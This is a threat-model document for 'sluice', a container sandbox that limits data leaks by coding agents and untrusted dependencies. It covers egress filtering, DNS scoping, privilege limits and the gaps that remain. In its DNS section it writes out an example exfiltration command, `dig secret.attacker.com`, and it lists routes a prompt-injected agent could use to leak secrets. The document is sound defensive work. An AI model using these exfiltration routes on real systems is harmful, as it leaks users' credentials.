# Threat model

What sluice defends against, what it deliberately does not, and where it's currently
weak. Read this before trusting it with anything that matters. For how the pieces work,
see the [README](README.md).

## What it's for (and not)

sluice is **anti-exfiltration + isolation-from-your-own-machine** for code you mostly
trust but can't fully vouch for - your coding agent, AI-generated code, a dependency
tree. It is **not** hostile-multi-tenant isolation: it does not safely run a stranger's
deliberately malicious code next to other tenants. That job needs a microVM
(Firecracker) or gVisor; sluice uses a normal container (shared kernel) on purpose.

## Assets being protected

- **Host credentials/secrets** the sluice can reach: env vars forwarded via `SLUICE_ENV`,
  token files mounted via `SLUICE_MOUNTS`, anything `SLUICE_PRELAUNCH` stages, and the
  project's own secrets (`.env`, keys in the working tree).
- **The rest of your machine:** other directories, other projects, your home dir.
- **Your network position:** internal/LAN services the host could otherwise reach.

## Adversary & trust boundary

| | |
|---|---|
| **Trusted** | the host; you, the `sluice.config.sh` author; the image build (runs pre-firewall with free egress) |
| **Untrusted** | everything executing **inside the sluice at runtime** - dependencies, the agent, generated code, tool/file inputs |

Threats in scope: a poisoned dependency (npm/pip post-install script), a prompt-injected
file or tool result steering an agent, or simply buggy agent code - any of which tries to
**exfiltrate secrets, tamper outside the project, or pivot into your network**.

### Data flow across the boundary

```
  HOST (trusted)                           |  CONTAINER (untrusted at runtime)
  ---------------------------------------  |  ------------------------------------------
  sluice.config.sh + build setup           |  image: deps baked pre-firewall (free egress)
  SLUICE_ENV / _MOUNTS / _PRELAUNCH    --> |  forwarded creds + project dir (read-write mount)
  SLUICE_POLICY_URL (fetched on host)  --> |  squid allowlist
                                           |
                                           |  app / agent / deps  (uid 1000, no effective caps)
                                           |       |  all tcp 80/443 redirected to squid
                                           |       v
                                           |  squid: only uid with egress; allow by Host/SNI,
                                           |  splice (never decrypt); IPv6 off, direct-IP/DoH dropped
                                           |       |
                                           |       v
                                           |  allowed hosts only
  =========================================+==========================================
  Right of the bar is untrusted at runtime; it reaches the network only through squid.
```

## Assumptions

The guarantees below hold only while these do:
- The **host is trusted** and uncompromised; the container engine + kernel enforce the isolation
  sluice configures.
- You **author and review** `sluice.config.sh` and anything it points at (`SLUICE_PRELAUNCH`,
  `SLUICE_POLICY_URL`) - these run host-side, pre-firewall, and are fully trusted.
- The **allowlist stays tight**: no allowed host doubles as a writable exfil channel, and
  `SLUICE_ALLOW_IPS` stays minimal (items 2-3 below).
- For the default runtime, the **shared host kernel** has no unpatched escape; `SLUICE_RUNTIME=kata`
  removes that assumption for the kernel-escape vector.

## What it defends against (today)

- **Secret exfiltration to arbitrary endpoints** -> default-DROP egress, enforced by an
  in-sluice **hostname-filtering proxy** (squid): all HTTP/HTTPS is redirected through it and
  allowed by **Host / TLS-SNI** (spliced, never decrypted), so the decision is by *domain*
  and survives IP rotation. Only the base hosts + `SLUICE_ALLOW_DOMAINS` are reachable; the
  boot self-test fails closed if a denied host or a direct-IP connection is reachable.
- **IP-literal / DNS / IPv6 bypasses** -> a direct-IP HTTPS connection has no SNI ->
  terminated; IPv6 is disabled entirely (we proxy v4 only, so a dual-stack app can't slip out over
  v6). **DNS resolution is scoped to the egress allowlist**: dnsmasq forwards only allowlisted names,
  and the firewall lets only it (not app code) reach a resolver - so an agent can't tunnel exfil as
  DNS labels to an off-allowlist authoritative nameserver (`dig secret.attacker.com`): a non-allowlisted
  name is answered locally with a dead sink (`192.0.2.1`, never forwarded), so the query never reaches
  that nameserver - while the sink connection still hits squid (so the block is logged for `learn`).
  Rebinding answers into RFC1918 are dropped. Known **DoH/DoT resolver
  endpoints** (`core/doh-endpoints.txt`) are denied *even if allowlisted* - otherwise an agent could
  tunnel exfil as DNS-over-HTTPS to an allowed resolver and bypass the SNI filter. `SLUICE_ALLOW_DOH=1`
  re-allows a DoH resolver; `SLUICE_DNS_OPEN=1` restores forward-all resolution (both weaken this).
- **Reading/altering the rest of your machine** -> only the project dir (and its git
  common dir, for worktrees) is mounted. Nothing else is visible.
- **Host privilege escalation** -> sessions run non-root (uid 1000) with **no effective
  capabilities**; no Docker socket, no Docker-in-Docker, no in-box `sudo` (setuid). The container
  drops ALL capabilities and adds back only what the root entrypoint needs at boot (chown the mount,
  drop squid to its uid, run the firewall, bind DNS, reload squid); `no-new-privileges` blocks any
  setuid path to root. So even a compromised in-box process has no route to the capabilities or to
  root. `--pids-limit` (`SLUICE_PIDS_LIMIT`) and optional `--memory` (`SLUICE_MEMORY`) keep a runaway
  agent or build from exhausting the host. An opt-in hardened seccomp profile
  (`SLUICE_SECCOMP=hardened`) additionally errors the in-container namespace-creation / tracing /
  keyctl / mount syscall class; its denylist is a strict **superset of the engine default**, so it
  also closes the non-cap-gated primitives the default blocks (`userfaultfd`, the `personality`
  ADDR_NO_RANDOMIZE self-ASLR-disable, `kcmp`). Off by default since blocking userns breaks
  browser-engine sandboxes - `SLUICE_SECCOMP=browser` keeps the hardening but re-allows the
  unshare/clone/mount calls a browser needs for its own userns sandbox, and `=audit` logs would-be
  blocks (`SCMP_ACT_LOG`) instead of enforcing. An opt-in
  `SLUICE_READONLY_ROOT=1` makes the rootfs immutable (tmpfs the ephemeral paths; `/etc/squid` +
  `/home/sluice` become writable anon volumes pre-populated from the image) so a process can't tamper
  with system files or leave persistence. (On SELinux-enforcing hosts the box runs
  `--security-opt label=disable` so it can read the project mount; that drops the SELinux layer, but
  the guarantees above are unaffected.)
- **Supply-chain fetch vs. runtime** -> deps are pulled at build (pre-firewall); the
  *running* container is locked to the allowlist.
- **Tampered sandbox core** -> the generic core (proxy, firewall, entrypoint, non-root user)
  can be pulled as a **cosign-signed base image** from GHCR (opt-in via `SLUICE_BASE_IMAGE`);
  `sluice` verifies the keyless signature before building on it (`SLUICE_REQUIRE_SIGNED=1` to
  enforce). CI also attaches a keyless **CycloneDX SBOM attestation** (in-toto) to the signed
  digest, and `sluice` soft-verifies it alongside the signature, so a verified base carries a
  signed inventory of what it contains. (The attested SBOM is amd64-derived; the apk/npm set is
  arch-invariant, only the purl arch qualifier differs.) The image carries no private key (the
  splice cert is generated per-container).
  Your declared `SLUICE_EXTRA_PKGS` are your own layer on top - `sluice lock` records a
  committable inventory (every apk, npm, pip, gem, go, and cargo package with its version + digest) so
  you can review and drift-detect exactly what's installed (`sluice doctor` flags drift; `sluice lock
  --check` gates CI on drift, `--enforce` the strict variant; `sluice lock --sbom` emits a deterministic
  CycloneDX or SPDX SBOM (`--format`), with apk integrity hashes, for scanners). It's an audit/drift aid,
  not a reproducibility guarantee (Wolfi apk is a rolling repo). `sluice lock --scan` runs that SBOM
  through a **host** Grype/Trivy (never baked) and can gate on severity - advisory, though: a clean
  result means "no *known* CVE in the scanner's DB,"
  not proof of safety.

## What it does NOT defend against (be explicit)

1. **Kernel escape / multi-tenant adversary.** The default box shares the host kernel. For the
   kernel-escape vector there is now an **opt-in** own-kernel runtime (`SLUICE_RUNTIME=kata`, Linux +
   containerd/nerdctl) that runs the box as a Kata micro-VM with the same firewall + non-root + mount
   guarantees. Hostile multi-tenant isolation remains a non-goal.
2. **Exfil through an *allowed* host.** The allowlist is **host-granular**. If you allow
   a shared host - `raw.githubusercontent.com`, a cloud storage endpoint, an LLM API -
   data can be laundered through it. Keep the list minimal; never allow a host an attacker can also
   write to. `sluice` flags such a host at session start (`SLUICE_LAUNDERING_OK=1` acknowledges and
   silences it, `SLUICE_STRICT_LAUNDERING=1` refuses to run).
3. **Exfil through `SLUICE_ALLOW_IPS`.** Reviewed fixed IPs get *direct* egress (the escape hatch for
   non-HTTP services like a database) - bypassing the proxy, so unfiltered by hostname. Scope each
   entry to one port with `ip:port` (a bare ip/cidr opens *every* port); keep the list minimal and specific.
4. **A squid vulnerability or a loose allowlist.** The egress policy now rests on squid +
   the allowlist file. A squid CVE or an over-broad `SLUICE_ALLOW_DOMAINS` is the trust anchor
   to guard - including the `.domain` wildcards `sluice learn` can write (a leading-dot entry
   matches *every* subdomain, so it's offered, never forced; prefer exact hosts when you can).
   `learn` applies your picks live (an in-place squid reload, no rebuild), but only ever **adds**
   the hosts you chose - it never weakens the non-HTTP/IPv6/non-root/direct-IP guarantees. (squid
   runs as its own uid; only that uid is granted direct egress, so app code can't reach the network
   except through it.)
5. **Destruction within the project dir.** By default it's mounted read-write, so the sluice
   can corrupt/delete your working tree (git history on the host is your backstop). Opt into
   `SLUICE_WORKSPACE=overlay` to mount the repo **read-only** and have the box edit a throwaway
   copy instead: the agent can't touch your files, and you review (`sluice diff`) and explicitly
   write back (`sluice apply`) - or discard by just stopping the box.
6. **Whatever `SLUICE_PRELAUNCH` does.** It runs on the **host** and is fully trusted - a
   malicious config is out of scope (you author it).
7. **Host-side Claude/editor hooks, side channels, timing.** Not addressed.
8. **Persisted state on the host.** `SLUICE_STATE_DIRS` (the agent presets use it) bind-mounts
   the agent's home subdirs to `~/.local/state/sluice/<project>/` - outside the project tree and
   kept across runs. The sandboxed agent reads/writes it (its own config/sessions and any tokens
   it caches there); treat that dir as sensitive, host-side state.
9. **`learn --audit` opens egress on purpose.** The opt-in discovery pass runs your command once
   with egress open to **all** HTTP/HTTPS hosts (incl. direct-IP on 80/443), so trusted code could
   exfiltrate over any host during that one run. It is gated precisely for this: **credential-stripped**
   (no `SLUICE_ENV`/`SLUICE_PRELAUNCH`/state dirs), **ephemeral** (a throwaway container, torn down
   after), loudly warned + confirm-gated, and never the default. Non-HTTP ports and IPv6 stay
   default-DROP. Use it only on code you trust.
10. **`SLUICE_POLICY_URL` is host-trusted and additive.** It's fetched on the **host** (before the box
    locks down) and can only **add** allowlist hosts - it never weakens the non-HTTP/IPv6/non-root/
    direct-IP guarantees. But the hosts it adds carry the same **allowed-host laundering** risk as any
    allowlist entry (item 2), and a malicious policy URL could add an exfil host - so point it only at a
    URL you control, same trust class as `SLUICE_PRELAUNCH` (you author the config).

## Scoped TLS interception (opt-in, off by default)

By default sluice **splices** every allowed host: it reads the SNI and passes the TLS through without
decrypting, so it can't inspect payloads (the allowed-host laundering gap, item 2). `SLUICE_BUMP_DOMAINS`
opts a **named** host into decryption: the box mints a per-container CA, trusts it, and forges that host's
cert so squid sees the full request and can filter by URL (`SLUICE_BUMP_URLS` denies non-matching paths;
omit it to allow the host wholesale but log full URLs). Every host *not* listed still splices - "never
decrypts" stays the default. Weigh before listing a host: (1) a CA signing key now lives in that one
container (per-run, never in the published base image; blast radius is the box itself); (2) **cert-pinned**
hosts can't be bumped and will fail TLS, so list only hosts you control or that don't pin; (3) you are
decrypting your own traffic to that host - the box's logs/egress receipt gain full URLs, so treat them as
sensitive. It narrows laundering for the listed host (path-level filtering) but does not eliminate it:
data hidden in an *allowed* path is still opaque.

## Residual risk, one line

Egress is **hostname-filtered** (squid splice) with IPv6 off, direct-IP blocked, and **DNS scoped to
the allowlist**, so the IP-rotation / direct-IP / DoH / DNS-label / v6 gaps are closed. The remaining
sharp edge is **allowed-host laundering**: because we splice (never decrypt), data hidden in a request
to an *allowed* host isn't inspected. Keep `SLUICE_ALLOW_DOMAINS`/`SLUICE_ALLOW_IPS` minimal (the
latter port-scoped) and never allow a host an attacker can also write to - `sluice` flags such a host
at run, a per-run **egress receipt** (hosts reached + bytes, in the state dir) makes after-the-fact
audit possible, and `SLUICE_EGRESS_MAX_BYTES` can gate CI on volume.

---

_Last reviewed 2026-06-05 against sluice 0.8.0 (released) + the post-release hardening on main: seccomp
(default-superset / browser / audit) and the egress work (allowlist-scoped DNS, port-scoped
`SLUICE_ALLOW_IPS`, laundering-host gate, durable egress receipt + `SLUICE_EGRESS_MAX_BYTES`). Revisit
when the egress path, mount model, or runtime options change._
